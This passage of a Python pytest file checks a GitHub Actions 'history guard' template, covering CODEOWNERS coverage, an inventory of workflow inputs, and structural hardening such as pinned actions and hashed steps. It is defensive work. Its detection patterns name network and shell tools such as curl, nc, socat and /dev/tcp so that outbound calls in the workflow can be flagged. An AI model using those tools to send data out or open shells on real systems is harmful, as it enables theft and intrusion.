# SPDX-License-Identifier: Apache-2.0
"""The history guard's boundary, proved offline (issue #926, follows #619).

Three things, each tested on the real shipped files:

1. The shipped CODEOWNERS example covers what it must. A small matcher with
   GitHub's rule (the last matching pattern wins) is run over the real template
   tree and over the paths a rewrite touches. This proves the file's coverage,
   not that GitHub enforces it: the live check in the template README is an
   owner step and activation stays blocked until it has been observed.
2. The README inventory lists every input the workflow and its script read.
   The workflow is parsed as YAML (expressions, env names, run text) and the
   script as Python (``env()`` names, API paths, URLs); an input that is not
   in the README table fails the test, and so does a stale row.
3. The workflow's hardening is checked structurally and by running the step
   text on real trees, not by searching for substrings.
"""

from __future__ import annotations

import ast
import os
import re
import shutil
import subprocess
import sys
from collections.abc import Iterator
from pathlib import Path
from typing import Any

import pytest
import yaml

ROOT = Path(__file__).resolve().parent.parent
TEMPLATE = ROOT / "examples" / "instance-repo"
WORKFLOW = TEMPLATE / ".github" / "workflows" / "history-guard.yml"
GUARD_PY = TEMPLATE / "scripts" / "history-guard.py"
CODEOWNERS = TEMPLATE / ".github" / "CODEOWNERS"
README = TEMPLATE / "README.md"


# --- 1. CODEOWNERS ----------------------------------------------------------


UNSUPPORTED = re.compile(r"[\[\]!?\\]")


def parse_codeowners(text: str) -> list[tuple[str, list[str]]]:
    """Rules in file order. A pattern with no owner un-owns its paths.

    GitHub skips a line with unsupported syntax (``!``, ``[ ]``, a backslash
    escape), so this boundary test refuses the file instead: a skipped line
    would silently leave a path unowned. ``?`` is refused too, because GitHub's
    page does not define it (read 2026-11-27).
    """
    rules: list[tuple[str, list[str]]] = []
    for line in text.splitlines():
        stripped = line.strip()
        if not stripped or stripped.startswith("#"):
            continue
        tokens: list[str] = []
        for token in stripped.split():
            if token.startswith("#"):
                break  # a trailing comment
            tokens.append(token)
        pattern, *owners = tokens
        if UNSUPPORTED.search(pattern) or "***" in pattern:
            raise ValueError(f"unsupported CODEOWNERS syntax: {pattern}")
        for part in pattern.split("/"):
            if "**" in part and part != "**":
                raise ValueError(f"unsupported CODEOWNERS syntax: {pattern}")
        rules.append((pattern, owners))
    return rules


def pattern_regex(pattern: str) -> re.Pattern[str]:
    """Segment-aware matching, after GitHub's CODEOWNERS page (read 2026-11-27).

    The page says the file "uses a pattern that follows most of the same rules
    used in gitignore files", that "the last matching pattern takes the most
    precedence", that ``docs/*`` matches ``docs/getting-started.md`` "but not
    further nested files", and that ``/docs/`` owns the directory "and any of
    its subdirectories". So: ``*`` never crosses ``/``; ``**`` as a whole
    segment does (``**/x``, ``a/**/b``, ``a/**``); a leading ``/`` or a ``/``
    inside the pattern anchors it to the root; a trailing ``/`` matches
    everything under that directory; a pattern that ends in a name matches that
    path only (the strict reading: it never claims a nested file by itself).
    """
    directory = pattern.endswith("/")
    core = pattern.strip("/")
    anchored = pattern.startswith("/") or "/" in core
    segments = core.split("/")
    out = ""
    for index, segment in enumerate(segments):
        last = index == len(segments) - 1
        if segment == "**":
            out += ".*" if last else "(?:[^/]+/)*"
            continue
        out += "".join("[^/]*" if c == "*" else re.escape(c) for c in segment)
        if not last:
            out += "/"
    head = "^" if anchored else "(?:^|.*/)"
    return re.compile(head + out + ("/.+$" if directory else "$"))


def owners_of(path: str, rules: list[tuple[str, list[str]]]) -> list[str]:
    result: list[str] = []
    for pattern, owners in rules:
        if pattern_regex(pattern).match(path):
            result = owners  # the last matching pattern wins
    return result


def owned(path: str, rules: list[tuple[str, list[str]]]) -> bool:
    return bool(owners_of(path, rules))


def example_rules() -> list[tuple[str, list[str]]]:
    return parse_codeowners(CODEOWNERS.read_text(encoding="utf-8"))


def trusted_sparse_paths() -> list[str]:
    steps = workflow()["jobs"]["history-guard"]["steps"]
    lines = steps[0]["with"]["sparse-checkout"].split("\n")
    return [ln.strip() for ln in lines if ln.strip()]


# What a rewrite is decided by, from the README and the guard: all must be owned.
PROTECTED = (
    ".github/history-approvers",
    ".github/CODEOWNERS",
    ".github/workflows/history-guard.yml",
    ".github/workflows/deploy.yml",
    "history/redactions/run-1.manifest",
    "scripts/history-guard.py",
    "scripts/verify-history-rewrite.sh",
    "scripts/read-lock.sh",
    "scripts/lib/nested/helper.py",  # a future nested guard file
    ".github/actions/local/action.yml",
    "engine.lock",
    "engine.release.json",
)
# Deliberately not owned: the daily refresh appends and needs no review.
UNOWNED = ("history/social.jsonl", "numbers.json", "site.yaml", "README.md")


def test_the_example_owns_every_protected_path_and_not_the_history_file() -> None:
    rules = example_rules()
    assert rules
    for path in PROTECTED:
        assert owned(path, rules), path
    for path in UNOWNED:
        assert not owned(path, rules), path


def test_every_shipped_file_under_the_guarded_paths_has_an_owner() -> None:
    """Walk the real template tree: the owned set is exactly the guarded set."""
    rules = example_rules()
    found = {
        p.relative_to(TEMPLATE).as_posix() for p in TEMPLATE.rglob("*") if p.is_file()
    }
    assert ".github/workflows/history-guard.yml" in found
    owned_set = {p for p in found if owned(p, rules)}
    guarded = {
        p
        for p in found
        if p.startswith((".github/", "scripts/"))
        or p in {"engine.lock", "engine.release.json"}
    }
    assert owned_set == guarded
    # Every workflow file is covered, not only this one.
    for workflow_file in (TEMPLATE / ".github" / "workflows").glob("*.yml"):
        assert owned(workflow_file.relative_to(TEMPLATE).as_posix(), rules)


def test_every_file_the_workflow_runs_from_the_base_is_owned() -> None:
    rules = example_rules()
    sparse = trusted_sparse_paths()
    assert sparse
    for path in sparse:
        assert (TEMPLATE / path).is_file(), path
        assert owned(path, rules), path


def test_the_example_names_a_single_placeholder_owner() -> None:
    rules = example_rules()
    assert {tuple(owners) for _, owners in rules} == {("@OWNER-LOGIN",)}


# Conformance fixtures: (patterns file, path, owned). Each row follows the
# GitHub page read 2026-11-27 (see pattern_regex); the first is the review's case.
MATCH_FIXTURES = [
    ("/scripts/* @o", "scripts/a.sh", True),
    ("/scripts/* @o", "scripts/vendor/evil.py", False),
    ("/scripts/** @o", "scripts/vendor/evil.py", True),
    ("/scripts/** @o", "scripts/a.sh", True),
    ("scripts/* @o", "scripts/a.sh", True),
    ("scripts/* @o", "scripts/vendor/evil.py", False),
    ("scripts/* @o", "x/scripts/a.sh", False),  # a slash inside anchors it
    ("/scripts/ @o", "scripts/vendor/evil.py", True),
    ("/scripts/ @o", "scripts/a.sh", True),
    ("/scripts/ @o", "scripts", False),
    ("/scripts/ @o", "other/scripts/a.sh", False),
    ("scripts/ @o", "other/scripts/a.sh", True),
    ("/scripts @o", "scripts", True),
    ("/scripts @o", "scripts/a.sh", False),  # strict: a name claims only itself
    ("**/name.py @o", "name.py", True),
    ("**/name.py @o", "a/b/name.py", True),
    ("**/name.py @o", "a/b/other.py", False),
    ("a/**/b @o", "a/b", True),
    ("a/**/b @o", "a/x/y/b", True),
    ("a/**/b @o", "a/x/c", False),
    ("*.md @o", "README.md", True),
    ("*.md @o", "docs/deep/README.md", True),
    ("*.md @o", "README.md.bak", False),
    ("/engine.lock @o", "engine.lock", True),
    ("/engine.lock @o", "sub/engine.lock", False),
    ("/engine.lock @o", "engine.lock.bak", False),
    ("/a/ @o\n/a/b/", "a/b/c", False),  # an empty-owner override un-owns
    ("/a/ @o\n/a/b/", "a/c", True),
    ("/a/b/\n/a/ @o", "a/b/c", True),  # the last match wins
    ("/a/ @o # note", "a/c", True),
    ("# /a/ @o", "a/c", False),
]


@pytest.mark.parametrize(("text", "path", "expected"), MATCH_FIXTURES)
def test_the_matcher_conforms_to_the_documented_cases(
    text: str, path: str, expected: bool
) -> None:
    assert owned(path, parse_codeowners(text)) is expected


@pytest.mark.parametrize(
    "line",
    ["!/a/ @o", "/a/[bc] @o", "\\#a @o", "/a/?.sh @o", "/a/b***c @o", "/a/b**c @o"],
)
def test_unsupported_syntax_is_refused_not_skipped(line: str) -> None:
    # GitHub skips such a line, which would leave a path unowned without a sound.
    with pytest.raises(ValueError, match="unsupported"):
        parse_codeowners(line)


def test_the_shipped_example_uses_only_supported_syntax() -> None:
    assert example_rules()  # parse_codeowners raised on nothing


def test_a_wildcard_rule_would_not_cover_a_nested_guard_file() -> None:
    # The review's mutation: /scripts/* in place of /scripts/ leaves nested code.
    text = CODEOWNERS.read_text(encoding="utf-8").replace("/scripts/ ", "/scripts/* ")
    assert "/scripts/* " in text
    rules = parse_codeowners(text)
    assert owned("scripts/history-guard.py", rules)
    assert not owned("scripts/vendor/evil.py", rules)


@pytest.mark.parametrize("lost", PROTECTED)
def test_dropping_every_rule_for_a_protected_path_leaves_it_unowned(lost: str) -> None:
    # Revert proof: a CODEOWNERS file without the rules that cover the path
    # fails the coverage check for exactly that path.
    rules = [(p, o) for p, o in example_rules() if not pattern_regex(p).match(lost)]
    assert not owned(lost, rules)
    assert [p for p in PROTECTED if not owned(p, rules)]


def test_an_unowning_override_after_the_rules_is_caught() -> None:
    text = CODEOWNERS.read_text(encoding="utf-8") + "/.github/workflows/\n"
    rules = parse_codeowners(text)
    assert not owned(".github/workflows/history-guard.yml", rules)
    assert any(not owned(p, rules) for p in PROTECTED)


# --- 2. the input inventory --------------------------------------------------


def workflow() -> dict[Any, Any]:
    data: dict[Any, Any] = yaml.safe_load(WORKFLOW.read_text(encoding="utf-8"))
    return data


def strings(node: Any) -> Iterator[str]:
    if isinstance(node, str):
        yield node
    elif isinstance(node, dict):
        for key, value in node.items():
            yield from strings(key)
            yield from strings(value)
    elif isinstance(node, list):
        for item in node:
            yield from strings(item)


EXPRESSION = re.compile(r"\$\{\{(.*?)\}\}", re.S)
CONTEXT_PATH = re.compile(
    r"(?<![\w.'\"])[A-Za-z_][\w-]*(?:\.[\w*-]+)+"
    r"|(?<![\w.'\"])[A-Za-z_]\w*(?![\w(.'\"])"
)
SHELL_VARIABLE = re.compile(r"\$\{?([A-Z][A-Z0-9_]*)\}?")


def workflow_inputs() -> set[str]:
    """Every context path, step env name and shell variable the workflow reads."""
    found: set[str] = set()
    data = workflow()
    for text in strings(data):
        for expression in EXPRESSION.findall(text):
            found.update(
                t
                for t in CONTEXT_PATH.findall(expression)
                if t not in {"true", "false", "null"}
            )
    for job in data["jobs"].values():
        for step in job["steps"]:
            found.update(step.get("env", {}))
            found.update(SHELL_VARIABLE.findall(step.get("run", "")))
    return found


def script_inputs() -> set[str]:
    """Environment names the script reads, from its syntax tree."""
    tree = ast.parse(GUARD_PY.read_text(encoding="utf-8"))
    found: set[str] = set()
    for node in ast.walk(tree):
        if isinstance(node, ast.Call):
            name = ast.unparse(node.func)
            if name in {"env", "os.environ.get", "os.getenv"} and node.args:
                first = node.args[0]
                if isinstance(first, ast.Constant) and isinstance(first.value, str):
                    found.add(first.value)
        elif isinstance(node, ast.Subscript) and ast.unparse(node.value) == (
            "os.environ"
        ):
            if isinstance(node.slice, ast.Constant) and isinstance(
                node.slice.value, str
            ):
                found.add(node.slice.value)
    return found


API_PATH = re.compile(r'f?"/repos/\{repo\}/([^"?]+)')


def script_api_paths() -> set[str]:
    return set(API_PATH.findall(GUARD_PY.read_text(encoding="utf-8")))


def inventory_text() -> str:
    readme = README.read_text(encoding="utf-8")
    start = readme.index("**Trusted inputs the workflow reads.**")
    end = readme.index("**Checklist before you list the first approver.**")
    assert start < end
    return readme[start:end]


def listed() -> set[str]:
    """Every backticked name in the first column of the inventory table."""
    names: set[str] = set()
    for row in inventory_text().splitlines():
        if row.startswith("| `"):
            first = row.split("|")[1]
            names.update(re.findall(r"`([^`]+)`", first))
    return names


def test_the_inventory_table_exists_and_has_rows() -> None:
    assert len(listed()) > 15


def test_the_workflow_reads_no_input_that_the_inventory_leaves_out() -> None:
    missing = workflow_inputs() - listed()
    assert not missing, sorted(missing)


def test_the_script_reads_no_input_that_the_inventory_leaves_out() -> None:
    from_script = script_inputs()
    assert {"REPO", "GH_TOKEN", "GITHUB_STEP_SUMMARY"} <= from_script  # parser works
    assert not (from_script - listed()), sorted(from_script - listed())
    guard = load_guard()
    for constant in (guard.HISTORY, guard.NUMBERS, guard.APPROVERS):
        assert constant in listed(), constant
    for api in script_api_paths():
        assert api in listed(), api


def test_the_inventory_names_no_input_that_nothing_reads() -> None:
    guard = load_guard()
    reads = workflow_inputs() | script_inputs() | script_api_paths()
    reads |= {guard.HISTORY, guard.NUMBERS, guard.APPROVERS, "history/redactions/"}
    reads |= set(trusted_sparse_paths())
    stale = listed() - reads
    assert not stale, sorted(stale)


def test_the_inventory_says_no_secrets_vars_inputs_or_artifacts() -> None:
    text = " ".join(inventory_text().split())
    assert "no `secrets`, no `vars`, no workflow `inputs`, no artifacts" in text
    # ...and that is true of the workflow itself, read as parsed data.
    for token in workflow_inputs():
        assert token.split(".")[0] not in {"secrets", "vars", "inputs", "env"}, token
    for text_ in strings(workflow()["jobs"]):
        assert "actions/upload-artifact" not in text_
        assert "actions/download-artifact" not in text_
        assert "actions/cache" not in text_


def test_the_inventory_checks_bite_on_an_unlisted_input(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    # Revert proof: add a secret, a var, an input and an unlisted event field to
    # a copy of the workflow and the extraction reports each of them.
    text = WORKFLOW.read_text(encoding="utf-8")
    text += (
        "      - run: echo\n"
        "        env:\n"
        "          A: ${{ secrets.TOKEN }}\n"
        "          B: ${{ vars.THING }}\n"
        "          C: ${{ inputs.x }}\n"
        "          D: ${{ github.event.pull_request.title }}\n"
        "          E: ${{ github.event.pull_request.user.login }}\n"
    )
    monkeypatch.setattr(sys.modules[__name__], "workflow", lambda: yaml.safe_load(text))
    extra = workflow_inputs() - listed()
    assert {
        "secrets.TOKEN",
        "vars.THING",
        "inputs.x",
        "github.event.pull_request.title",
        "github.event.pull_request.user.login",
    } <= extra


def test_a_shell_variable_in_a_run_step_is_an_input_too(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    text = WORKFLOW.read_text(encoding="utf-8").replace(
        'echo "dir=$dir" >> "$GITHUB_OUTPUT"',
        'echo "dir=$dir $SOME_OTHER_SETTING" >> "$GITHUB_OUTPUT"',
    )
    assert "SOME_OTHER_SETTING" in text
    monkeypatch.setattr(sys.modules[__name__], "workflow", lambda: yaml.safe_load(text))
    assert "SOME_OTHER_SETTING" in workflow_inputs() - listed()


def load_guard() -> Any:
    import importlib.util

    spec = importlib.util.spec_from_file_location("hg_boundary_under_test", GUARD_PY)
    assert spec is not None and spec.loader is not None
    module = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = module
    spec.loader.exec_module(module)
    return module


# --- 3. hardening, structurally and by behavior -----------------------------

PINNED = re.compile(r"^[\w.-]+/[\w./-]+@[0-9a-f]{40}$")
WRITE_SCOPES = {"write", "write-all"}


def all_steps() -> list[dict[str, Any]]:
    """The steps of EVERY job, not only the expected one."""
    return [
        step for job in workflow()["jobs"].values() for step in job.get("steps", [])
    ]


def test_no_permission_anywhere_is_a_write_and_no_job_is_a_reusable_call() -> None:
    data = workflow()
    scopes = [data["permissions"]]
    scopes += [job.get("permissions", {}) for job in data["jobs"].values()]
    for scope in scopes:
        assert isinstance(scope, dict)
        assert set(scope.values()) <= {"read"}, scope
    for job in data["jobs"].values():
        assert "uses" not in job  # a called workflow would hold its own token
        assert "secrets" not in job
        assert "environment" not in job
        assert "env" not in job
    assert "env" not in data


def test_every_action_is_pinned_by_commit_and_keeps_no_credentials() -> None:
    uses = [s for s in all_steps() if "uses" in s]
    assert len(uses) == 3
    for step in uses:
        assert PINNED.match(step["uses"]), step["uses"]
        assert step["with"]["persist-credentials"] is False
        assert step["uses"].startswith("actions/checkout@")


def test_no_run_step_holds_an_expression_and_only_the_last_gets_the_token() -> None:
    steps = all_steps()
    for step in steps:
        assert "${{" not in step.get("run", "")
        assert "continue-on-error" not in step
        assert "if" not in step  # no step can be skipped by a condition
    holders = [s["name"] for s in steps if "GH_TOKEN" in s.get("env", {})]
    assert holders == ["Guard the history file"]
    assert steps[-1]["name"] == "Guard the history file"


def test_the_head_is_checked_out_as_data_after_the_trusted_copies() -> None:
    steps = all_steps()
    names = [s["name"] for s in steps]
    head = names.index("Fetch the pull request head")
    assert names.index("Install the trusted copies and choose the engine image") < head
    pr_checkout = steps[head]["with"]
    assert pr_checkout["ref"] == "${{ github.event.pull_request.head.sha }}"
    assert pr_checkout["path"] == "pr"
    # Nothing runs from the head's folder: the only executed path is the trusted dir.
    for step in steps:
        run = step.get("run", "")
        assert "pr/scripts" not in run
        assert not re.search(r"(^|\s)(bash|python3?|sh)\s+\S*\bpr/", run)


def stage_trusted_tree(root: Path, with_release: bool) -> Path:
    """A real sparse checkout: only the listed files of the template, at the base."""
    base = root / "trusted-src"
    for rel in trusted_sparse_paths():
        if rel == "engine.release.json" and not with_release:
            continue
        target = base / rel
        target.parent.mkdir(parents=True, exist_ok=True)
        shutil.copy2(TEMPLATE / rel, target)
    return base


def run_like_actions(
    text: str, cwd: Path, env: dict[str, str]
) -> subprocess.CompletedProcess[bytes]:
    """The shell form GitHub Actions uses for `shell: bash` (the default on
    Linux): the run text in a file, run as bash --noprofile --norc -e -o
    pipefail FILE. A step must fail closed under exactly these flags."""
    script = cwd / "step.sh"
    script.write_text(text, encoding="utf-8")
    return subprocess.run(  # noqa: S603 - fixed argv, step text from the repo
        ["bash", "--noprofile", "--norc", "-e", "-o", "pipefail", str(script)],  # noqa: S607
        cwd=cwd,
        env=env,
        capture_output=True,
        check=False,
    )


JQ_STUB = """#!{python}
# A pure-python stand-in for the few jq calls read-lock.sh makes, so the
# release-mismatch test always runs, on a runner with or without jq.
# Supported: jq -e/-r/-j FLAGS, then '.key' or '.key | strings', then a file.
import json
import sys

args = sys.argv[1:]
flags = "".join(a[1:] for a in args if a.startswith("-"))
rest = [a for a in args if not a.startswith("-")]
filt, path = rest[0], rest[1]
key = filt.split("|")[0].strip().lstrip(".")
only_strings = filt.split("|")[1:] == [" strings"]
value = json.load(open(path)).get(key)
if only_strings and not isinstance(value, str):
    sys.exit(5)
if "e" in flags and value in (None, False):
    sys.exit(1)
text = value if isinstance(value, str) else json.dumps(value)
sys.stdout.write(text if "j" in flags else text + "\\n")
"""


def jq_stub_dir(root: Path) -> Path:
    folder = root / "stub-bin"
    folder.mkdir(exist_ok=True)
    target = folder / "jq"
    target.write_text(JQ_STUB.format(python=sys.executable), encoding="utf-8")
    target.chmod(0o755)
    return folder


def run_trust_step(root: Path) -> subprocess.CompletedProcess[bytes]:
    step = next(s for s in all_steps() if s.get("id") == "trust")
    runner_temp = root / "runner-temp"
    runner_temp.mkdir(exist_ok=True)
    output = root / "github-output"
    output.write_text("", encoding="utf-8")
    env = {
        "PATH": f"{jq_stub_dir(root)}:{os.environ['PATH']}",
        "RUNNER_TEMP": str(runner_temp),
        "GITHUB_OUTPUT": str(output),
    }
    return run_like_actions(step["run"], root, env)


def installed_dir(root: Path) -> Path:
    line = (root / "github-output").read_text(encoding="utf-8").strip()
    assert line.startswith("dir=")
    return Path(line[4:])


def test_the_trust_step_installs_read_only_base_copies_not_the_pull_request(
    tmp_path: Path,
) -> None:
    base = stage_trusted_tree(tmp_path, with_release=False)
    # A hostile head checkout sits beside it: it must never be copied.
    hostile = tmp_path / "pr" / "scripts"
    hostile.mkdir(parents=True)
    (hostile / "history-guard.py").write_text("raise SystemExit(0)\n", encoding="utf-8")
    (tmp_path / "pr" / "engine.lock").write_text("HOSTILE=1\n", encoding="utf-8")
    done = run_trust_step(tmp_path)
    assert done.returncode == 0, done.stderr
    folder = installed_dir(tmp_path)
    try:
        for rel in ("scripts/history-guard.py", "scripts/read-lock.sh", "engine.lock"):
            assert (folder / rel).read_bytes() == (base / rel).read_bytes(), rel
        # Read-only: no write bit anywhere in the installed tree.
        for path in (folder, *folder.rglob("*")):
            assert path.stat().st_mode & 0o222 == 0, path
        assert not (folder / "pr").exists()
        # The workflow file and the approvers file are not installed here.
        assert not (folder / ".github").exists()
    finally:
        for path in (folder, *folder.rglob("*")):
            path.chmod(path.stat().st_mode | 0o700)


def test_the_trust_step_fails_when_a_trusted_file_is_missing(tmp_path: Path) -> None:
    base = stage_trusted_tree(tmp_path, with_release=False)
    (base / "engine.lock").unlink()
    done = run_trust_step(tmp_path)
    assert done.returncode != 0
    assert not (tmp_path / "github-output").read_text(encoding="utf-8").strip()


def test_the_trust_step_stops_a_bad_release_pair_before_any_output(
    tmp_path: Path,
) -> None:
    base = stage_trusted_tree(tmp_path, with_release=True)
    ok = run_trust_step(tmp_path)
    assert ok.returncode == 0, ok.stderr
    first = installed_dir(tmp_path)
    for path in (first, *first.rglob("*")):
        path.chmod(path.stat().st_mode | 0o700)
    # A manifest from another release: the step must fail, not just warn.
    manifest = base / "engine.release.json"
    manifest.write_text(
        manifest.read_text(encoding="utf-8").replace('"commit": "', '"commit": "0'),
        encoding="utf-8",
    )
    (tmp_path / "github-output").write_text("", encoding="utf-8")
    bad = run_trust_step(tmp_path)
    for leftover in (tmp_path / "runner-temp").glob("trusted.*"):
        for path in (leftover, *leftover.rglob("*")):
            path.chmod(path.stat().st_mode | 0o700)
    assert bad.returncode != 0
    assert not (tmp_path / "github-output").read_text(encoding="utf-8").strip()


def test_the_sparse_base_checkout_holds_what_the_guard_needs_to_run(
    tmp_path: Path,
) -> None:
    """The installed folder must hold every script the guard and wrapper call."""
    base = stage_trusted_tree(tmp_path, with_release=False)
    guard_text = GUARD_PY.read_text(encoding="utf-8")
    wrapper = (TEMPLATE / "scripts" / "verify-history-rewrite.sh").read_text("utf-8")
    needed = {m for m in re.findall(r"scripts/[\w.-]+", guard_text + wrapper)} | {
        "scripts/history-guard.py",
        "scripts/verify-history-rewrite.sh",
    }
    for rel in needed:
        if (TEMPLATE / rel).is_file():
            assert (base / rel).is_file(), f"{rel} is not in the base checkout"
    assert (base / "engine.lock").is_file()


# --- 4. the workflow is pinned step by step, and reaches only GitHub ---------
#
# Inventorying variable NAMES (section 2) does not stop a new step, a second job
# or a rebuilt URL. These controls do: every job is checked, every step must
# match one entry of STEP_TABLE, and nothing may call out except to the GitHub
# API of this repository.
#
# TO CHANGE THE WORKFLOW ON PURPOSE: edit the workflow, run
#     python tests/test_history_guard_boundary.py
# which prints the new table rows, review each changed step by name in the pull
# request, and paste the rows into STEP_TABLE below. A change that does not
# update the table fails test_the_workflow_matches_the_pinned_step_table and
# names the step, so a reviewer cannot miss it. The script's own destinations
# are checked from its syntax tree (script_problems), not pinned by hash, so
# ordinary script edits do not need a table change.

import hashlib  # noqa: E402
import json  # noqa: E402

ALLOWED_JOBS = frozenset({"history-guard"})
ALLOWED_HOSTS = frozenset({"api.github.com"})
ALLOWED_IMPORTS = frozenset(
    {
        "__future__",
        "argparse",
        "json",
        "os",
        "re",
        "subprocess",
        "sys",
        "tempfile",
        "urllib.error",
        "urllib.parse",
        "urllib.request",
        "datetime",
        "pathlib",
        "typing",
    }
)
ALLOWED_FROM = frozenset({"__future__", "datetime", "pathlib", "typing"})
FORBIDDEN_CALLS = frozenset(
    {"eval", "exec", "compile", "__import__", "getattr", "setattr", "globals", "vars"}
)
SUBPROCESS_PROGRAMS = frozenset({"git", "bash"})

NETWORK_WORD = re.compile(
    r"(?<![\w./$-])(curl|wget|nc|ncat|netcat|socat|ssh|scp|sftp|telnet|ftp|gh|dig"
    r"|nslookup|openssl|npm|npx|pip|pip3|uv|apt|apt-get|docker|podman)(?![\w-])"
)
NETWORK_TOKEN = re.compile(
    r"urllib|requests|http\.client|httplib|socket|httpx|aiohttp|ftplib|smtplib"
    r"|/dev/tcp|/dev/udp|\bpython3?\s+(?:-\w+\s+)*-c\b"
    r"|\bgit\s+(?:-\S+\s+)*(?:fetch|pull|clone|push|ls-remote|remote|submodule)\b"
)
URL_HOST = re.compile(r"[A-Za-z][A-Za-z0-9+.-]*://([^/\s'\"]*)")


def normalized_run(text: str) -> str:
    return "\n".join(line.rstrip() for line in text.strip().splitlines())


def step_digest(step: dict[str, Any]) -> str:
    """SHA-256 of the whole step (name, uses, with, env, run) in canonical form."""
    canon = dict(step)
    if "run" in canon:
        canon["run"] = normalized_run(canon["run"])
    blob = json.dumps(canon, sort_keys=True, separators=(",", ":"))
    return hashlib.sha256(blob.encode("utf-8")).hexdigest()


# (step name, action pinned by commit or "run", digest of the whole step)
STEP_TABLE: list[tuple[str, str, str]] = [
    (
        "Fetch the trusted files from the base commit",
        "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
        "432116a9fbffe13a3cc63a01a7398127a827ddacebab76c18ecd897c35ecf45e",
    ),
    (
        "Fetch the running copy of this workflow",
        "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
        "d6912861be7727996addd2e03cb8eb4bd7de7ad10e876ed946b15e93cc3c8292",
    ),
    (
        "Refuse when the running workflow differs from the base copy",
        "run",
        "aca1c35db897f3aa1b70fbcc9fadcf0a0cac08f154405094874989648b2dd33b",
    ),
    (
        "Install the trusted copies and choose the engine image",
        "run",
        "2bd4f2164d53e6c1803e93982cd69572963e02a799b5d7c9d4770624e9c644ad",
    ),
    (
        "Fetch the pull request head",
        "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
        "56157046f0082340be2d530b19fe213733f52aaa2011a343d0bdeaac05a1363c",
    ),
    (
        "Guard the history file",
        "run",
        "842effc8be6f367c12ec84efc28e74fe221586d0ccc055d24d9b8696857cac82",
    ),
]


def shell_problems(
    text: str, where: str, allow: frozenset[str] = frozenset()
) -> list[str]:
    """Network-capable commands and foreign hosts in shell text. Comments are
    ignored: only what runs is read."""
    code = "\n".join(
        line for line in text.splitlines() if not line.lstrip().startswith("#")
    )
    found = [
        f"{where}: network command {m}"
        for m in NETWORK_WORD.findall(code)
        if m not in allow
    ]
    found += [f"{where}: network use {m}" for m in NETWORK_TOKEN.findall(code)]
    for host in URL_HOST.findall(code):
        if host not in ALLOWED_HOSTS:
            found.append(f"{where}: host {host or '(empty)'} is not allowed")
    return found


def workflow_problems(data: dict[Any, Any]) -> list[str]:
    """Everything wrong with a workflow's jobs and steps; empty means as pinned."""
    found: list[str] = []
    jobs = data.get("jobs", {})
    for name in jobs:
        if name not in ALLOWED_JOBS:
            found.append(f"job {name}: not an expected job")
    for name in ALLOWED_JOBS - set(jobs):
        found.append(f"job {name}: missing")
    table = {entry[0]: entry for entry in STEP_TABLE}
    for job_name, job in jobs.items():
        if "uses" in job:
            found.append(f"job {job_name}: calls a reusable workflow")
        steps = job.get("steps", [])
        for step in steps:
            label = f"{job_name}/{step.get('name', step.get('uses', '?'))}"
            if "uses" in step and not str(step["uses"]).startswith("actions/checkout@"):
                found.append(f"{label}: action {step['uses']} is not allowed")
            if "run" in step:
                found += shell_problems(step["run"], label)
            for value in strings(step.get("with", {})):
                found += shell_problems(value, f"{label} (with)")
            if job_name in ALLOWED_JOBS:
                entry = table.get(step.get("name", ""))
                if entry is None:
                    found.append(f"step {label}: not in STEP_TABLE")
                elif entry[2] != step_digest(step):
                    found.append(
                        f"step {label}: changed; new digest {step_digest(step)}"
                    )
        if job_name in ALLOWED_JOBS and [s.get("name") for s in steps] != [
            e[0] for e in STEP_TABLE
        ]:
            found.append(f"job {job_name}: the list of steps changed")
    return found


def script_problems(source: str) -> list[str]:
    """Network and execution surface of the guard script, from its syntax tree."""
    tree = ast.parse(source)
    found: list[str] = []
    api_ok = False
    url_forms = {
        ast.dump(ast.parse(code, mode="eval").body)
        for code in ('f"{API}{path}"', "match.group(1)")
    }
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            for alias in node.names:
                if alias.name not in ALLOWED_IMPORTS:
                    found.append(f"import {alias.name} is not allowed")
        elif isinstance(node, ast.ImportFrom):
            if node.module not in ALLOWED_FROM:
                found.append(f"from {node.module} import is not allowed")
        elif isinstance(node, ast.Call):
            name = ast.unparse(node.func)
            if name in FORBIDDEN_CALLS:
                found.append(f"call {name} is not allowed")
            if name.startswith("subprocess."):
                first = node.args[0] if node.args else None
                program = (
                    first.elts[0]
                    if isinstance(first, ast.List) and first.elts
                    else None
                )
                if not (
                    isinstance(program, ast.Constant)
                    and program.value in SUBPROCESS_PROGRAMS
                ):
                    found.append("subprocess call with a program that is not fixed")
                if any(k.arg == "shell" for k in node.keywords):
                    found.append("subprocess call with shell")
            if name == "urllib.request.urlopen" and not (
                node.args
                and isinstance(node.args[0], ast.Name)
                and node.args[0].id == "request"
            ):
                found.append("urlopen is not called with the request built from url")
            if name == "urllib.request.Request" and not (
                node.args
                and isinstance(node.args[0], ast.Name)
                and node.args[0].id == "url"
            ):
                found.append("Request is not built from the url variable")
            if name == "api_get":
                arg = node.args[0] if node.args else None
                lead = arg.values[0] if isinstance(arg, ast.JoinedStr) else arg
                if not (
                    isinstance(lead, ast.Constant)
                    and isinstance(lead.value, str)
                    and lead.value.startswith("/repos/")
                ):
                    found.append("api_get path does not start with /repos/")
        elif isinstance(node, ast.Attribute):
            base = ast.unparse(node.value)
            if base == "os" and node.attr not in {"environ", "getenv"}:
                found.append(f"os.{node.attr} is not allowed")
            if base == "urllib.request" and node.attr not in {"Request", "urlopen"}:
                found.append(f"urllib.request.{node.attr} is not allowed")
        elif isinstance(node, ast.Assign):
            targets = [ast.unparse(t) for t in node.targets]
            if targets == ["url"] and ast.dump(node.value) not in url_forms:
                found.append("url is assigned a value that is not API plus a path")
            if targets == ["API"]:
                value = node.value
                api_ok = (
                    isinstance(value, ast.Constant)
                    and isinstance(value.value, str)
                    and value.value.startswith("https://")
                    and value.value[len("https://") :] in ALLOWED_HOSTS
                )
        elif isinstance(node, ast.BinOp) and isinstance(node.op, (ast.Add, ast.Mod)):
            for side in (node.left, node.right):
                if (
                    isinstance(side, ast.Constant)
                    and isinstance(side.value, str)
                    and side.value.strip()
                ):
                    found.append("a string is built by + or %: use a constant")
        elif (
            isinstance(node, ast.Constant)
            and isinstance(node.value, str)
            and "://" in node.value
            and not (isinstance(node.value, str) and node.value.startswith("https://"))
        ):
            found.append("a string holds a URL scheme that is not https")
    if not api_ok:
